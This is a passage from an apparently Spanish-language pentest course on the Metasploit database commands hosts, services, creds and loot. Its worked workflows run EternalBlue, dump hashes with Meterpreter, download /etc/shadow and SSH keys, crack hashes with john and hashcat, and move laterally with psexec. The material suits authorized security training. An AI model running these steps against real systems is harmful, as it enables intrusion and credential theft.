# 2. Configurar RHOSTS automáticamente
msf6 > hosts -S Windows -R
RHOSTS => 10.10.10.40 192.168.1.20 192.168.1.30

# 3. Usar exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. Verificar que RHOSTS ya está configurado
msf6 exploit(ms17_010...) > show options

Module options:
   Name     Current Setting                      Required
   ----     ---------------                      --------
   RHOSTS   10.10.10.40 192.168.1.20 192.168.1.30  yes  ← ✅

# 5. ¡Solo ejecutar!
msf6 exploit(ms17_010...) > run

[*] Trying 10.10.10.40...
[+] 10.10.10.40 - Exploit completed!
[*] Trying 192.168.1.20...
[+] 192.168.1.20 - Exploit completed!
...
```

**SIN `-R flag`**: Tendrías que copiar/pegar las IPs manualmente una por una.

**CON `-R flag`**: Automático, rápido, sin errores.

#### Agregar Comentarios

```bash
msf6 > hosts -m "Domain Controller - CRITICAL" 10.10.10.40

[*] Updated host 10.10.10.40

msf6 > hosts -c address,comments

Hosts
=====

address      comments
-------      --------
10.10.10.40  Domain Controller - CRITICAL
192.168.1.50 Database Server - Contains PII
```

**Útil para**:
- Marcar hosts importantes
- Anotar prioridades
- Recordar información clave
- Marcar hosts que NO debes tocar

#### Agregar Tags

```bash
msf6 > hosts -t production 192.168.1.0/24

[*] Tagged 45 hosts with 'production'

msf6 > hosts -t database 192.168.1.50

[*] Tagged 1 host with 'database'

msf6 > hosts -t critical 10.10.10.40

[*] Tagged 1 host with 'critical'
```

**Búsqueda posterior por tags**:

```bash
msf6 > hosts -S production
[Shows all hosts tagged 'production']

msf6 > hosts -S critical
[Shows all hosts tagged 'critical']
```

**Combinación de tags**:

```bash
msf6 > hosts -t critical,database 192.168.1.50

[*] Tagged host with 'critical,database'
```

### Columnas Avanzadas (Metadata)

Algunas columnas muestran **estadísticas útiles**:

```bash
msf6 > hosts -c address,cred_count,service_count,vuln_count,exploit_attempt_count

Hosts
=====

address      cred_count  service_count  vuln_count  exploit_attempt_count
-------      ----------  -------------  ----------  ---------------------
10.10.10.40  5           9              3           2
192.168.1.10 2           4              1           0
192.168.1.50 8           12             7           5
```

**Interpretación**:

| Host | cred_count | service_count | vuln_count | exploit_attempt_count |
|------|------------|---------------|------------|-----------------------|
| 10.10.10.40 | 5 creds | 9 servicios | 3 vulns | 2 intentos de exploit |
| 192.168.1.10 | 2 creds | 4 servicios | 1 vuln | 0 intentos |
| 192.168.1.50 | 8 creds | 12 servicios | 7 vulns | 5 intentos |

**192.168.1.50 es claramente el más comprometido/explotado.**

**Uso práctico**:

```bash
# "Dame los top 5 hosts con más credenciales"
msf6 > hosts -c address,cred_count -O cred_count | tail -5

# "Dame hosts que tengo credenciales pero no he explotado"
msf6 > hosts -c address,cred_count,exploit_attempt_count | \
       awk '$2 > 0 && $3 == 0'
```

---

## 🔌 Comando: services

El comando `services` funciona igual que `hosts`, pero para servicios detectados.

### Uso Básico

```bash
msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10
```

### Ver Ayuda

```bash
msf6 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] 
                [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type (tcp|udp)
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```

### Filtrar por Puerto

```bash
msf6 > services -p 445

Services
========

host         port  proto  name          state  info
----         ----  -----  ----          -----  ----
10.10.10.40  445   tcp    microsoft-ds  open   Microsoft Windows 7 - 10
192.168.1.10 445   tcp    netbios-ssn   open   Samba smbd 4.9.5
192.168.1.20 445   tcp    microsoft-ds  open   Windows Server 2019
```

**Uso**: Encontrar todos los hosts con SMB (puerto 445).

**Puertos múltiples**:

```bash
msf6 > services -p 80,443,8080

[Shows all web servers on ports 80, 443, or 8080]
```

### Filtrar por Nombre de Servicio

```bash
msf6 > services -s http

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.8   80    tcp    http  open   HttpFileServer httpd 2.3
192.168.1.20 8080  tcp    http  open   Apache httpd 2.4.41
192.168.1.30 443   tcp    http  open   nginx 1.18.0
```

**Uso**: Encontrar todos los servidores web.

**Servicios múltiples**:

```bash
msf6 > services -s http,https,ssl

[Shows all web services]
```

### Filtrar por Protocolo

```bash
msf6 > services -r udp

Services
========

host         port  proto  name    state  info
----         ----  -----  ----    -----  ----
192.168.1.1  53    udp    domain  open   DNS Server
192.168.1.1  67    udp    dhcps   open   DHCP Server
192.168.1.10 161   udp    snmp    open   SNMPv2c
```

**Uso**: Ver solo servicios UDP (típicamente menos comunes pero importantes).

### Configurar RHOSTS desde Services

```bash
msf6 > services -s http -R

RHOSTS => 10.10.10.8 192.168.1.20 192.168.1.30
```

**Workflow típico**:

```bash
# 1. Buscar todos los servidores HTTP
msf6 > services -s http -R
RHOSTS => 10.10.10.8 192.168.1.20 192.168.1.30

# 2. Usar módulo de directory bruteforce
msf6 > use auxiliary/scanner/http/dir_scanner

# 3. RHOSTS ya configurado automáticamente
msf6 auxiliary(dir_scanner) > show options
   RHOSTS   10.10.10.8 192.168.1.20 192.168.1.30  ← ✅

# 4. Ejecutar
msf6 auxiliary(dir_scanner) > run
```

### Agregar Servicio Manualmente

```bash
msf6 > services -a -r tcp -p 3389 -s ms-wbt-server 192.168.1.50

[*] Added service: 192.168.1.50:3389/tcp (ms-wbt-server)
```

**Uso**: Cuando descubres un servicio manualmente (no con Nmap).

---

(Continúa en siguiente archivo con creds, loot y resumen ejecutivo...)## 🔑 Comando: creds

El comando `creds` muestra todas las credenciales recolectadas durante el pentest.

### ¿De Dónde Vienen las Credenciales?

```
FUENTES DE CREDENCIALES EN METASPLOIT:

1. POST-EXPLOITATION MODULES:
   - post/windows/gather/hashdump
   - post/windows/gather/smart_hashdump  
   - post/windows/gather/credentials/credential_collector
   - post/linux/gather/hashdump
   - post/multi/gather/ssh_creds

2. CREDENTIAL DUMPERS:
   - Mimikatz (meterpreter > load mimikatz)
   - LaZagne
   - CredDump
   - Windows Credential Manager

3. MANUAL (encontraste en archivos):
   - config.php con DB password
   - .bash_history con passwords
   - Scripts con credenciales hardcodeadas
   - Archivos .txt con passwords
   
4. BRUTEFORCE MODULES:
   - auxiliary/scanner/ssh/ssh_login
   - auxiliary/scanner/smb/smb_login
   - auxiliary/scanner/ftp/ftp_login
   - auxiliary/scanner/mysql/mysql_login

5. CRACKING:
   - Exportaste hashes
   - Crackeaste con John/Hashcat
   - Importaste creds de vuelta a MSF
```

### Uso Básico

```bash
msf6 > creds

Credentials
===========

host         origin       service        public  private                                    realm  private_type
----         ------       -------        ------  -------                                    -----  ------------
10.10.10.40  10.10.10.40  445/tcp (smb)  admin   31d6cfe0d16ae931b73c59d7e0c089c0:::                NTLM hash
10.10.10.40  10.10.10.40  445/tcp (smb)  bob     P@ssw0rd123                                        Password
192.168.1.10 192.168.1.10 22/tcp (ssh)   root    /root/.ssh/id_rsa                                  SSH private key
192.168.1.20 192.168.1.20 3306/tcp(mysql) dbuser  mysql123                                         Password
```

### Columnas Explicadas

| Columna | Descripción | Ejemplo |
|---------|-------------|---------|
| `host` | Host donde funciona la credencial | 10.10.10.40 |
| `origin` | Host de donde se extrajo originalmente | 10.10.10.40 |
| `service` | Servicio asociado | 445/tcp (smb) |
| `public` | Username / parte pública | admin |
| `private` | Password / Hash / Key | P@ssw0rd123 |
| `realm` | Dominio (para Active Directory) | ACME.LOCAL |
| `private_type` | Tipo de credencial | Password, NTLM hash, SSH key |

**Diferencia host vs origin**:
- `host` = Donde la credential **funciona**
- `origin` = De donde se **extrajo**

**Ejemplo**:
```
Comprometes 192.168.1.50 (Windows Server)
Extraes hashes con hashdump
Encuentras: admin:hash123

origin = 192.168.1.50 (de ahí salió)
host = 192.168.1.50 (funciona ahí)

PERO si pruebas ese hash en otros hosts:
192.168.1.60 → admin:hash123 ¡FUNCIONA! (password reusado)

Ahora tienes 2 entradas:
  host=192.168.1.50, origin=192.168.1.50, admin:hash123
  host=192.168.1.60, origin=192.168.1.50, admin:hash123
```

### Ver Ayuda Completa

```bash
msf6 > creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters:
    user      :  Public, usually a username
    password  :  Private, private_type Password
    ntlm      :  Private, private_type NTLM Hash
    postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be a file path
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John the Ripper hash type
    realm     :  Realm (domain)
    realm-type:  Realm type (domain, db2db, sid, pgdb, rsync, wildcard)

Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:WORKGROUP
   
   # Add a user and password
   creds add user:guest password:'guest password'
   
   # Add just a password (no username)
   creds add password:'password without username'
   
   # Add a user with NTLM hash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   
   # Add just an NTLM hash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   
   # Add a Postgres MD5 password
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   
   # Add a user with SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5

General options:
  -h,--help             Show this help information
  -o <file>             Send output to a file in csv/jtr/hashcat format
                        .jtr extension → john the ripper format
                        .hcat extension → hashcat format
                        otherwise → CSV
  -d,--delete           Delete one or more credentials

Filter options for listing:
  -P,--password <text>  List passwords that match this text
  -p,--port <portspec>  List creds with logins on services matching port
  -s <svc names>        List creds matching comma-separated service names
  -u,--user <text>      List users that match this text
  -t,--type <type>      List creds matching types: password,ntlm,hash
  -O,--origins <IP>     List creds that match these origins
  -R,--rhosts           Set RHOSTS from the results
  -v,--verbose          Don't truncate long password hashes
```

### Agregar Credenciales Manualmente

#### User + Password

```bash
msf6 > creds add user:admin password:P@ssw0rd123 realm:WORKGROUP

[+] Added credential: admin:P@ssw0rd123 (WORKGROUP)
```

#### User + NTLM Hash (Windows)

```bash
msf6 > creds add user:administrator ntlm:31d6cfe0d16ae931b73c59d7e0c089c0:aad3b435b51404eeaad3b435b51404ee

[+] Added credential: administrator (NTLM hash)
```

**Formato NTLM**: `LM_HASH:NT_HASH`
- Parte 1 (antes de `:`): LM hash (legacy, generalmente vacío ahora)
- Parte 2 (después de `:`): NT hash (el importante)

#### User + SSH Key

```bash
msf6 > creds add user:root ssh-key:/root/.ssh/id_rsa

[+] Added credential: root (SSH private key)
```

**La key debe existir en ese path**.

#### Solo Password (sin username)

```bash
msf6 > creds add password:'SuperSecret123!'

[+] Added credential: (password only)
```

**Útil cuando**: Encontraste un password en un archivo pero no sabes a qué usuario pertenece.

### Filtrar Credenciales

#### Por Usuario

```bash
msf6 > creds -u admin

Credentials
===========

host         service  public  private      private_type
----         -------  ------  -------      ------------
10.10.10.40  smb      admin   P@ssw0rd123  Password
192.168.1.20 ssh      admin   admin123     Password
192.168.1.30 rdp      admin   hash:abc...  NTLM hash
```

**Muestra todas las credenciales del usuario "admin"** en diferentes hosts/servicios.

#### Por Password (buscar reutilización)

```bash
msf6 > creds -P password

Credentials
===========

host         public  private   
----         ------  -------   
10.10.10.40  bob     password
192.168.1.30 alice   Password1
192.168.1.50 test    password123
```

**Útil para**: Encontrar passwords débiles que se usan múltiples veces.

#### Por Tipo de Credencial

```bash
msf6 > creds -t ntlm

Credentials
===========

host         public        private                                    private_type
----         ------        -------                                    ------------
10.10.10.40  administrator 31d6cfe0d16ae931b73c59d7e0c089c0:::        NTLM hash
192.168.1.20 admin         aad3b435b51404eeaad3b435b51404ee:::        NTLM hash
```

**Tipos disponibles**:
- `password` - Texto plano
- `ntlm` - NTLM hashes
- `hash` - Otros hashes (MD5, SHA, etc.)
- `ssh-key` - SSH keys

#### Por Servicio

```bash
msf6 > creds -s smb

Credentials
===========

host         service  public  private
----         -------  ------  -------
10.10.10.40  smb      admin   P@ssw0rd123
10.10.10.40  smb      bob     hash:31d6...
```

**Muestra solo credenciales asociadas con SMB.**

#### Por Puerto

```bash
msf6 > creds -p 22

Credentials
===========

host         port  public  private
----         ----  ------  -------
192.168.1.10 22    root    /root/.ssh/id_rsa
192.168.1.20 22    admin   ssh_password123
```

**Muestra credenciales del puerto 22 (SSH).**

### Exportar Credenciales

#### Formato CSV (default)

```bash
msf6 > creds -o creds_export.csv

[*] Exported 47 credentials to creds_export.csv
```

**Contenido**:

```csv
host,service,public,private,realm,private_type
10.10.10.40,445/tcp (smb),admin,P@ssw0rd123,WORKGROUP,Password
10.10.10.40,445/tcp (smb),bob,31d6cfe0...,WORKGROUP,NTLM hash
192.168.1.10,22/tcp (ssh),root,/root/.ssh/id_rsa,,SSH private key
```

#### Formato John the Ripper

```bash
msf6 > creds -o creds_export.jtr

[*] Exported to John the Ripper format
```

**Contenido** (`creds_export.jtr`):

```
admin:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:aad3b435b51404eeaad3b435b51404ee:::
alice:$6$xyz...abc...
```

**Ahora puedes crackear**:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt creds_export.jtr

Loaded 3 password hashes
Press 'q' or Ctrl-C to abort
P@ssword123  (admin)
password     (bob)
2 of 3 hashes cracked, 1 remaining
```

#### Formato Hashcat

```bash
msf6 > creds -o creds_export.hcat

[*] Exported to Hashcat format
```

**Contenido** (`creds_export.hcat`):

```
admin:31d6cfe0d16ae931b73c59d7e0c089c0
bob:aad3b435b51404eeaad3b435b51404ee
```

**Crackear con Hashcat**:

```bash
$ hashcat -m 1000 creds_export.hcat /usr/share/wordlists/rockyou.txt

# -m 1000 = NTLM hash mode
```

### Hash Types para John the Ripper

El material del curso lista tipos de hash comunes:

**Operating Systems**:
```
Blowfish ($2a$)   : bf
BSDi     (_)      : bsdi
DES               : des,crypt
MD5      ($1$)    : md5
SHA256   ($5$)    : sha256,crypt
SHA512   ($6$)    : sha512,crypt
```

**Databases**:
```
MSSQL             : mssql
MSSQL 2005        : mssql05
MSSQL 2012/2014   : mssql12
MySQL < 4.1       : mysql
MySQL >= 4.1      : mysql-sha1
Oracle            : des,oracle
Oracle 11         : raw-sha1,oracle11
Oracle 12c        : oracle12c
Postgres          : postgres,raw-md5
```

**Ejemplo de uso con tipo de hash**:

```bash
msf6 > creds add user:dbadmin hash:md5be86a79bf2043622d58d5453c47d4860 jtr:postgres

[+] Added Postgres MD5 credential
```

### Borrar Credenciales

```bash
msf6 > creds -d -s smb

[*] Deleted 5 SMB credentials
```

**⚠️ Cuidado**: Esto borra permanentemente.

### Workflow Completo con Credenciales

```bash
# ════════════════════════════════════════════════════
# WORKFLOW: POST-EXPLOITATION → CREDENTIAL DUMPING
# ════════════════════════════════════════════════════

# 1. Comprometer sistema Windows
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOST 10.10.10.40
msf6 exploit(...) > run

[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.10.10.40:49158)

# 2. Migrar a proceso estable
meterpreter > ps
[Process list]
meterpreter > migrate 1234
[*] Migrated to lsass.exe

# 3. Dumpear hashes
meterpreter > hashdump

[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Bob:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Alice:1002:aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb:::

[+] Hashes saved to database automatically

# 4. Volver a msfconsole
meterpreter > background
[*] Backgrounding session 1...

# 5. Ver las credenciales en la database
msf6 > creds

Credentials
===========

host         service      public         private                                    private_type
----         -------      ------         -------                                    ------------
10.10.10.40  445/tcp(smb) Administrator  31d6cfe0d16ae931b73c59d7e0c089c0:::        NTLM hash
10.10.10.40  445/tcp(smb) Bob            8846f7eaee8fb117ad06bdd830b7586c:::        NTLM hash
10.10.10.40  445/tcp(smb) Alice          ee0c207898a5bccc01f38115019ca2fb:::        NTLM hash

# 6. Exportar para cracking
msf6 > creds -o hashes_to_crack.jtr

# 7. Crackear offline
$ john --wordlist=rockyou.txt hashes_to_crack.jtr
P@ssw0rd123  (Bob)
Summer2021!  (Alice)

# 8. Agregar passwords crackeados de vuelta a MSF
msf6 > creds add user:Bob password:P@ssw0rd123
msf6 > creds add user:Alice password:Summer2021!

# 9. Usar credenciales para lateral movement
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set SMBUser Bob
msf6 exploit(psexec) > set SMBPass P@ssw0rd123
msf6 exploit(psexec) > set RHOST 192.168.1.50
msf6 exploit(psexec) > run

[*] Meterpreter session 2 opened (lateral movement successful!)
```

---

## 💰 Comando: loot

El comando `loot` muestra archivos/datos valiosos extraídos de sistemas comprometidos.

### ¿Qué es "Loot"?

**Loot** = Botín = Archivos valiosos que extraes de los targets durante post-exploitation.

**Ejemplos de loot**:

```
WINDOWS:
  ├─ SAM database (contiene hashes de passwords locales)
  ├─ SYSTEM registry hive
  ├─ NTDS.dit (Active Directory database)
  ├─ LSA secrets (credenciales almacenadas)
  ├─ Cached credentials
  ├─ Browser saved passwords (Chrome, Firefox, Edge)
  ├─ Wi-Fi passwords
  ├─ AutoLogon credentials
  ├─ Archivos de configuración (.config, .ini)
  └─ Screenshots de pantalla

LINUX:
  ├─ /etc/shadow (password hashes)
  ├─ /etc/passwd (user accounts)
  ├─ SSH keys (.ssh/id_rsa, .ssh/authorized_keys)
  ├─ Database dumps (.sql)
  ├─ Archivos de config (.conf, .cfg, .yaml)
  ├─ History files (.bash_history, .zsh_history)
  ├─ Cron jobs
  └─ Environment variables con secrets

APLICACIONES:
  ├─ Database connection strings
  ├─ API keys (AWS, Azure, Google Cloud)
  ├─ JWT tokens
  ├─ Session cookies
  └─ Archivos de logs con información sensible
```

### Uso Básico

```bash
msf6 > loot

Loot
====

host         service  type           name       content     info                      path
----         -------  ----           ----       -------     ----                      ----
10.10.10.40  smb      windows.hashes hashdump   text/plain  SAM database hashes       /root/.msf4/loot/20250121_145623_hashdump.txt
10.10.10.40           windows.system registry   binary      SYSTEM registry hive      /root/.msf4/loot/20250121_145624_system.reg
192.168.1.10 ssh      linux.shadow   shadow     text/plain  /etc/shadow contents      /root/.msf4/loot/20250121_150115_shadow.txt
192.168.1.10 ssh      linux.passwd   passwd     text/plain  /etc/passwd contents      /root/.msf4/loot/20250121_150116_passwd.txt
192.168.1.20          ssh.key        id_rsa     text/plain  SSH private key           /root/.msf4/loot/20250121_151045_id_rsa
192.168.1.30          screenshot     desktop    image/png   Desktop screenshot        /root/.msf4/loot/20250121_152301_screenshot.png
```

### Columnas Explicadas

| Columna | Descripción |
|---------|-------------|
| `host` | De qué host se extrajo |
| `service` | Servicio asociado (si aplica) |
| `type` | Tipo de loot (categoría) |
| `n` | Nombre descriptivo |
| `content` | Tipo de contenido (MIME type) |
| `info` | Descripción adicional |
| `path` | **Ruta donde se guardó el archivo** |

**La columna `path` es CRÍTICA** - ahí está el archivo que extraíste.

### Ver Ayuda

```bash
msf6 > loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```

### Agregar Loot Manualmente

```bash
msf6 > loot -f /tmp/passwords.txt -i "Passwords found in config" -a 192.168.1.50 -t passwords

[+] Added loot: passwords.txt
[*] Stored at: /root/.msf4/loot/20250121_153045_passwords.txt
```

**Desglose**:
- `-f /tmp/passwords.txt` = Archivo fuente
- `-i "Passwords..."` = Descripción
- `-a 192.168.1.50` = Host de donde vino
- `-t passwords` = Tipo de loot

**Metasploit COPIA el archivo** de `/tmp/passwords.txt` a su directorio de loot `/root/.msf4/loot/`.

### Filtrar por Tipo

```bash
msf6 > loot -t windows.hashes

Loot
====

host         type           name       info                  path
----         ----           ----       ----                  ----
10.10.10.40  windows.hashes hashdump   SAM database hashes   /root/.msf4/loot/..._hashdump.txt
192.168.1.20 windows.hashes lsadump    LSA secrets dump      /root/.msf4/loot/..._lsasecrets.txt
```

**Tipos comunes**:
- `windows.hashes` - Password hashes de Windows
- `windows.sam` - SAM registry hive
- `windows.system` - SYSTEM registry hive
- `linux.shadow` - /etc/shadow
- `linux.passwd` - /etc/passwd
- `ssh.key` - SSH private keys
- `passwords` - Passwords en texto plano
- `config` - Archivos de configuración
- `database.dump` - Database dumps
- `screenshot` - Capturas de pantalla

### Búsqueda de Texto

```bash
msf6 > loot -S password

Loot
====

host         type      name          info                          path
----         ----      ----          ----                          ----
192.168.1.50 passwords passwords.txt Passwords found in config     /root/.msf4/loot/...
192.168.1.60 config    app.config    Contains DB password          /root/.msf4/loot/...
```

**Busca "password" en cualquier campo** (type, name, info).

### Borrar Loot

```bash
msf6 > loot -d 192.168.1.50

[*] Deleted all loot from 192.168.1.50
[*] Deleted 3 files
```

**⚠️ Esto borra los archivos del filesystem también.**

### Workflow Completo con Loot

```bash
# ═══════════════════════════════════════════════════════
# WORKFLOW: POST-EXPLOITATION → LOOT EXTRACTION
# ═══════════════════════════════════════════════════════

# 1. Comprometer sistema Windows
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > run
[*] Meterpreter session 1 opened

# 2. Dumpear hashes (automáticamente va a loot)
meterpreter > hashdump
[+] Hashes dumped
[+] Stored in loot: /root/.msf4/loot/20250121_hashdump.txt

# 3. Extraer SAM y SYSTEM (para cracking offline avanzado)
meterpreter > run post/windows/gather/smart_hashdump
[+] SAM saved to loot
[+] SYSTEM saved to loot

# 4. Tomar screenshot
meterpreter > screenshot
[*] Screenshot saved to /root/.msf4/loot/20250121_screenshot.png

# 5. Buscar archivos interesantes
meterpreter > search -f *.config
Found: C:\inetpub\wwwroot\web.config

meterpreter > download C:\inetpub\wwwroot\web.config
[*] Downloaded to /root/web.config

# 6. Agregar a loot manualmente
meterpreter > background

msf6 > loot -f /root/web.config -i "IIS web.config with DB connection string" -a 10.10.10.40 -t config
[+] Added to loot

# 7. Repetir para sistema Linux
msf6 > sessions 2
meterpreter > download /etc/shadow
meterpreter > download /etc/passwd
meterpreter > download /root/.ssh/id_rsa

# (Automáticamente guardado en loot por Meterpreter)

# 8. Ver todo el loot recolectado
msf6 > loot

Loot
====

host         type           name          path
----         ----           ----          ----
10.10.10.40  windows.hashes hashdump      /root/.msf4/loot/..._hashdump.txt
10.10.10.40  windows.sam    sam           /root/.msf4/loot/..._sam.reg
10.10.10.40  windows.system system        /root/.msf4/loot/..._system.reg
10.10.10.40  screenshot     desktop       /root/.msf4/loot/..._screenshot.png
10.10.10.40  config         web.config    /root/.msf4/loot/..._web.config
192.168.1.10 linux.shadow   shadow        /root/.msf4/loot/..._shadow.txt
192.168.1.10 linux.passwd   passwd        /root/.msf4/loot/..._passwd.txt
192.168.1.10 ssh.key        id_rsa        /root/.msf4/loot/..._id_rsa

# 9. Acceder a los archivos
msf6 > cat /root/.msf4/loot/20250121_hashdump.txt
Administrator:500:aad3...:31d6...:::
Bob:1001:aad3...:8846...:::

# 10. Exportar todo para el reporte
$ tar -czf loot_backup.tar.gz /root/.msf4/loot/
```

### Ubicación de Loot en Filesystem

```
DIRECTORIO DE LOOT:
/root/.msf4/loot/

ESTRUCTURA:
/root/.msf4/loot/
├── 20250121_145623_10.10.10.40_windows.hashes_hashdump.txt
├── 20250121_145624_10.10.10.40_windows.system_registry.reg
├── 20250121_150115_192.168.1.10_linux.shadow_shadow.txt
├── 20250121_150116_192.168.1.10_linux.passwd_passwd.txt
├── 20250121_151045_192.168.1.20_ssh.key_id_rsa
└── 20250121_152301_10.10.10.40_screenshot_desktop.png

FORMATO DE NOMBRE:
YYYYMMDD_HHMMSS_<IP>_<type>_<name>.<ext>
```

**Puedes acceder directamente**:

```bash
$ ls -lh /root/.msf4/loot/

total 2.3M
-rw-r--r-- 1 root root 1.2K Jan 21 14:56 20250121_145623_10.10.10.40_windows.hashes_hashdump.txt
-rw-r--r-- 1 root root 256K Jan 21 14:56 20250121_145624_10.10.10.40_windows.system_registry.reg
-rw-r--r-- 1 root root 845  Jan 21 15:01 20250121_150115_192.168.1.10_linux.shadow_shadow.txt
-rw-r--r-- 1 root root 2.1K Jan 21 15:01 20250121_150116_192.168.1.10_linux.passwd_passwd.txt
-rw-r--r-- 1 root root 1.8K Jan 21 15:10 20250121_151045_192.168.1.20_ssh.key_id_rsa
-rw-r--r-- 1 root root 1.8M Jan 21 15:23 20250121_152301_10.10.10.40_screenshot_desktop.png
```

---

## 🎓 Resumen Ejecutivo

### Conceptos Clave Aprendidos

**1. ¿Por Qué Databases?**
- Organizar información masiva de pentests complejos (100+ hosts)
- Evitar pérdida de datos, duplicación, desorganización
- Consultas instantáneas (SQL queries)
- Relaciones entre hosts → services → vulns → creds

**2. PostgreSQL en Metasploit**
- RDBMS (Relational Database Management System) open source
- Soporta consultas SQL complejas
- Performance escalable (1,000 a 1,000,000 hosts)
- ACID compliant (integridad de datos garantizada)

**3. Configuración**
```bash
sudo service postgresql status    # Verificar estado
sudo systemctl start postgresql   # Iniciar
sudo msfdb init                   # Inicializar database MSF
sudo msfdb run                    # Conectar automáticamente
db_status                         # Verificar conexión
```

**4. Workspaces**
- Carpetas virtuales que separan proyectos/clientes
- `workspace -a nombre` = crear nuevo
- `workspace nombre` = cambiar a workspace
- Exportación limpia por cliente (seguridad)

**5. Import/Export**
- `db_import file.xml` = importar scans de Nmap/Nessus
- `db_nmap -sV target` = scan directo (auto-import)
- `db_export -f xml backup.xml` = backup completo

**6. Comandos Principales**
- `hosts` = Gestionar hosts descubiertos
- `services` = Gestionar servicios detectados
- `creds` = Gestionar credenciales recolectadas
- `loot` = Gestionar archivos extraídos

### Comandos de Referencia Rápida

```bash
# ═══════════════════════════════════════════════
# SETUP INICIAL
# ═══════════════════════════════════════════════
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run
db_status

# ═══════════════════════════════════════════════
# WORKSPACES
# ═══════════════════════════════════════════════
workspace -a client_name       # Crear workspace
workspace client_name          # Cambiar workspace
workspace -v                   # Ver con estadísticas
workspace -d old_project       # Borrar workspace

# ═══════════════════════════════════════════════
# IMPORT/EXPORT
# ═══════════════════════════════════════════════
db_import scan.xml             # Importar Nmap/Nessus
db_nmap -sV 192.168.1.0/24     # Scan directo
db_export -f xml backup.xml    # Backup completo

# ═══════════════════════════════════════════════
# CONSULTAS - HOSTS
# ═══════════════════════════════════════════════
hosts                          # Listar todos
hosts -S Windows               # Buscar "Windows"
hosts -u                       # Solo hosts up
hosts -c address,os_name       # Columnas específicas
hosts -S Windows -R            # → RHOSTS automático
hosts -m "Critical" 10.10.10.40 # Agregar comentario
hosts -o export.csv            # Exportar a CSV

# ═══════════════════════════════════════════════
# CONSULTAS - SERVICES
# ═══════════════════════════════════════════════
services                       # Listar todos
services -p 445                # Puerto 445 (SMB)
services -s http               # Servicio HTTP
services -r udp                # Protocolo UDP
services -s http -R            # → RHOSTS automático

# ═══════════════════════════════════════════════
# CONSULTAS - CREDENTIALS
# ═══════════════════════════════════════════════
creds                          # Listar todas
creds -u admin                 # Usuario "admin"
creds -t ntlm                  # Solo NTLM hashes
creds -s smb                   # Servicio SMB
creds -o hashes.jtr            # Exportar para John
creds add user:admin password:P@ss  # Agregar manual

# ═══════════════════════════════════════════════
# CONSULTAS - LOOT
# ═══════════════════════════════════════════════
loot                           # Listar todo
loot -t windows.hashes         # Solo hashes Windows
loot -S password               # Buscar "password"
loot -f file.txt -i "desc" -a IP -t type  # Agregar
```

### Workflow Completo de Pentest con Database

```bash
# ════════════════════════════════════════════════════════
# DÍA 1 - SETUP
# ════════════════════════════════════════════════════════
$ sudo msfdb run
msf6 > workspace -a acme_corp_external_2025
msf6 > db_export -f xml baseline_empty.xml  # Backup inicial

# ════════════════════════════════════════════════════════
# DÍA 2-3 - DISCOVERY & SCANNING
# ════════════════════════════════════════════════════════
msf6 > db_nmap -sn 192.168.1.0/24           # Host discovery
msf6 > hosts                                # Verify
msf6 > db_nmap -sV -sC 192.168.1.0/24       # Service scan
msf6 > services                             # Verify
msf6 > db_export -f xml day3_discovery.xml  # Backup

# ════════════════════════════════════════════════════════
# DÍA 4-7 - EXPLOITATION
# ════════════════════════════════════════════════════════
msf6 > services -p 445 -R                   # Auto-set targets
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > run
[*] Meterpreter session 1 opened

meterpreter > hashdump                      # Auto-saved to creds
